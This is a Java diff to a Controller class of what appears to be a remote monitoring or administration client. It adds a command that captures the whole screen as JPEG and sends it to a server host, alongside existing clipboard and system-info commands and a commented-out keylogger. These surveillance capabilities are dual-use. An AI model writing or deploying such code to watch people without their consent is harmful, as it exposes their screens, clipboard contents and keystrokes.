@@ -2,9 +2,14 @@ package controllers;
 
 import models.MessageModel;
 import models.SystemInfoModel;
+import org.json.JSONArray;
 import utils.Helper;
 import utils.JSON;
 
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.HashMap;
 import java.util.Map;
@@ -24,6 +29,7 @@ public class Controller {
         put(COMMAND_MONITORING, Controller::getMonitoring);
         put(COMMAND_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
+        put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
 //        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
     }
 
@@ -32,6 +38,22 @@ public class Controller {
 //                .put("keylogger", new JSONArray(KeyLogger.getKeylog()))
 //                .json();
 //    }
+
+    private static String getScreen(JSON input) {
+        try {
+            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            ImageIO.write(image, "jpg", byteArrayOutputStream);
+            byte[] tmp = byteArrayOutputStream.toByteArray();
+            return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
+                    .put(COMMAND, COMMAND_CLIENT_SCREEN)
+                    .put("image", new JSONArray(tmp))
+                    .put("length", tmp.length)
+                    .json();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
 
     private static String getClipboard(JSON input) {
         return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIPBOARD)
@@ -47,7 +69,7 @@ public class Controller {
                 .json();
     }
 
-    private static String getClientSystemInfo(JSON admin) {
+    private static String getClientSystemInfo(JSON input) {
         return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
                 .put(COMMAND, COMMAND_CLIENT_SYSTEM_INFO)
                 .put("result", new JSON(si))
